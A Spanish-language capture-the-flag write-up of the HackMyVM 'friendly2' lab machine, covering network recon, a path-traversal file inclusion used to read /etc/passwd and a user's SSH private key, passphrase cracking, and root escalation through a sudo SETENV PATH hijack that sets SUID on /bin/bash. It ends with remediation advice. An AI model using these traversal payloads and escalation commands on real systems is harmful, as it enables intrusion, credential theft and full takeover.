# Writeup - Pentest 192.168.1.143 (friendly2)

**Máquina**: friendly2 (HackMyVM)  
**OS**: Debian 11 (Bullseye) - Kernel 5.10.0-21-amd64  
**IP**: 192.168.1.143  
**Fecha**: 26 de mayo de 2026

---

## 1. Reconocimiento

### 1.1 Descubrimiento de hosts

```bash
sudo arp-scan -I eth0 --localnet
```

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:ec:3f:6c, IPv4: 192.168.1.X
Starting arp-scan 1.10.0 with 256 hosts
192.168.1.1	52:54:00:12:35:00	QEMU
192.168.1.143	08:00:27:0c:8f:a4	PCS Systemtechnik GmbH
```

Identificamos la máquina víctima en `192.168.1.143`.

### 1.2 Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.1.143 -oG all_ports.txt
```

```bash
nmap -p22,80 -sCV 192.168.1.143
```

Resultados:

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | open | SSH | OpenSSH 8.4p1 Debian |
| 80/tcp | open | HTTP | Apache 2.4.56 (Debian) |

TTL: 64 → Linux  
MAC: `08:00:27:0C:8F:A4` → Oracle VirtualBox

### 1.3 Enumeración web

Página principal: `Servicio de Mantenimiento de Ordenadores`

```bash
ffuf -u http://192.168.1.143/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -e .php
```

Directorios encontrados:
- `/tools/` - Sistema de herramientas internas
- `/assets/` - Recursos estáticos
- `/server-status/` - 403 Forbidden

Al ver el código fuente de la página `/tools/` se encuentra un comentario HTML:
```html
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```

Subdirectorio: `/tools/documents/` con archivos HTML (keyboard.html, laptop.html, monitor.html)

---

## 2. Explotación - LFI (Local File Inclusion)

### 2.1 Identificación del LFI

El endpoint `/tools/check_if_exist.php?doc=X` carga documentos desde `/var/www/html/tools/documents/`.

Usando path traversal para leer el propio código fuente:
```
http://192.168.1.143/tools/check_if_exist.php?doc=../check_if_exist.php
```

Código revelado:
```php
<?php
if(isset($_GET['doc'])) {
    $filename = $_GET['doc'];
    readfile("/var/www/html/tools/documents/" . $filename);
}
?>
```

### 2.2 Lectura de /etc/passwd

```
http://192.168.1.143/tools/check_if_exist.php?doc=../../../../../etc/passwd
```

Usuario relevante: `gh0st:x:1001:1001::/home/gh0st:/bin/bash`

### 2.3 Fuga de clave SSH

```
http://192.168.1.143/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa
```

Se obtiene la clave privada SSH de `gh0st` (protegida con passphrase). La guardamos en un archivo local:

```bash
curl -s "http://192.168.1.143/tools/check_if_exist.php?doc=../../../../../home/gh0st/.ssh/id_rsa" > id_rsa
chmod 600 id_rsa
```

### 2.4 Cracking de la passphrase

```bash
/usr/share/john/ssh2john.py id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

**Passphrase**: `celtic`

### 2.5 Acceso SSH

```bash
ssh -i id_rsa gh0st@192.168.1.143
# Passphrase: celtic
```

**User flag**: `<REDACTED>` (`/home/gh0st/user.txt`)

---

## 3. Escalada de privilegios

### 3.1 Enumeración sudo

```bash
sudo -l
```

```
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

Clave: `SETENV` permite pasar variables de entorno al ejecutar con sudo.

### 3.2 Análisis de /opt/security.sh

```bash
#!/bin/bash

read string

if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

El script usa `tr` (y `grep`) sin rutas absolutas. Aunque `secure_path` está definido en sudoers, el tag `SETENV` permite sobreescribir variables de entorno como `PATH`, anulando `secure_path`.

### 3.3 PATH Hijacking (método más simple)

El script ejecuta `tr` sin ruta absoluta. Con `SETENV` podemos sobreescribir el PATH para que ejecute nuestro propio `tr`.

**Paso 1**: Crear un script `tr` malicioso en `/tmp`:

```bash
echo '#!/bin/bash' > /tmp/tr
echo 'chmod +s /bin/bash' >> /tmp/tr
chmod +x /tmp/tr
```

**Paso 2**: Ejecutar el script con sudo, forzando PATH para que incluya `/tmp` primero:

```bash
sudo PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games /opt/security.sh
```

Cuando el script llame a `tr $sus1 $sus2`, bash buscará `tr` en el PATH y encontrará `/tmp/tr` (nuestro script), ejecutándolo como **root** gracias a sudo. Esto aplica SUID a `/bin/bash`.

### 3.4 Shell como root

```bash
bash -p
# whoami → root
```

El flag `-p` preserva el EUID (sin él, bash dropea privilegios).

> **Alternativa con BASH_FUNC_**: También se puede lograr sin crear archivos, inyectando una función bash directamente:
> ```bash
> sudo BASH_FUNC_tr%%='() { chmod +s /bin/bash; /usr/bin/tr "$@"; }' /opt/security.sh <<< test
> ```

### 3.5 Root flag

```bash
bash -p -c 'cat /.../ebbg.txt'
```

```
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq

Hint: numbers are not codified
```

**ebbg.txt** es ROT13 de **root.txt**. Aplicando ROT13 solo a las letras:

```bash
echo "98199n723q0s44s6rs39r33685q8pnoq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Root flag**: `<REDACTED>`

---

## 4. Resumen de vulnerabilidades

| Vulnerabilidad | Descripción | Gravedad |
|----------------|-------------|----------|
| LFI sin sanitización | `readfile()` con concatenación directa de input | Alta |
| Exposición de clave SSH | Clave privada accesible vía LFI | Alta |
| Passphrase débil | `celtic` en rockyou.txt | Media |
| Sudo con SETENV | Permite PATH hijacking para ejecución como root | Alta |

---

## 5. Recomendaciones

1. **Sanitizar input** en `check_if_exist.php` - usar `basename()` o whitelist de archivos permitidos
2. **Restringir permisos** de la clave SSH en `/home/gh0st/.ssh/` - 600
3. **Eliminar SETENV** del sudoers o restringirlo específicamente
4. **Eliminar binarios SUID** no necesarios
5. **Política de contraseñas** más fuerte
